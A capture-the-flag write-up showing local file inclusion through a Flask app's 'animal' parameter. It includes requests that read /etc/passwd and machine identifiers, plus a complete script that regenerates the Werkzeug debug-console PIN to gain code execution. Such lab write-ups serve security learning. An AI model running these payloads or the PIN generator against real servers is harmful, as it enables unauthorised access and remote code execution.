### Discover : 
==> http://chal.b01lers.com:5000/?animal=dogs 
here we try to to inject our lfi payloads in the animal param : 

==> http://chal.b01lers.com:5000/?animal=/etc/passwd 
It look very promising but it only render 200 char from the file so i assume it returns f.read(200) 
anyways let's see 
==> http://chal.b01lers.com:5000/?animal=/whatever 
we get an error which reveal some interesting part 
so its 
- ## Flask APP
- ## Name : loremipsum.py 
```python
@app.route('/')
def index():
 f = request.args.get('animal', 'dogs')
 with open(f, 'r') as f:
 file\_content = f.read(200)
 ``` 
 
after this part i tried to somehow bypass the return length (the 200) but it didn't work 
the flag was +200 char and its located there 
==> http://chal.b01lers.com:5000/?animal=flag 

### Exploiting 

meanwhile i was running #dirsearch.py in the background and its showed that the debug was open but its secured with pin 
==> http://chal.b01lers.com:5000/console 
and directly i went to this 
writeup ==> https://ctftime.org/writeup/17955 
 
so i leaked => "/sys/class/net/<inet>/address"
					=> "/etc/machine-id"
and tried to remake the pin code : 
so this was my code:

```python 
	import hashlib
from itertools import chain
import hashlib
from itertools import chain
public_bits = [
    'loremipsum',# the username
    'flask.app',
    'Flask', 
    '/usr/local/lib/python3.6/dist-packages/flask/app.py' # (via the error msg)
]

private_bits = [
    '2485378547714',  # => /sys/class/net/<inet>/address
    'b875f129-5ae6-4ab1-90c0-ae07a6134578' + 'e8c9f0084a3b2b724e4f2a526d60bf0a62505f38649743b8522a8c005b8334ae' # => /etc/machine-id 
    ]

hashed = hashlib.md5()
for bit in chain(public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    hashed.update(bit)
hashed.update(b'cookiesalt')

cookie_name = '__wzd' + hashed.hexdigest()[:20]

num = None
if num is None:
    hashed.update(b'pinsalt')
    num = ('%09d' % int(hashed.hexdigest(), 16))[:9]

rezult =None
if rezult is None:
    for g_size in 5, 4, 3:
        if len(num) % g_size == 0:
            rezult = '-'.join(num[x:x + g_size].rjust(g_size, '0')
                          for x in range(0, len(num), g_size))
            break
    else:
        rezult = num

print(rezult)
	``` 
	And then just : 
	![[flag 1.png]]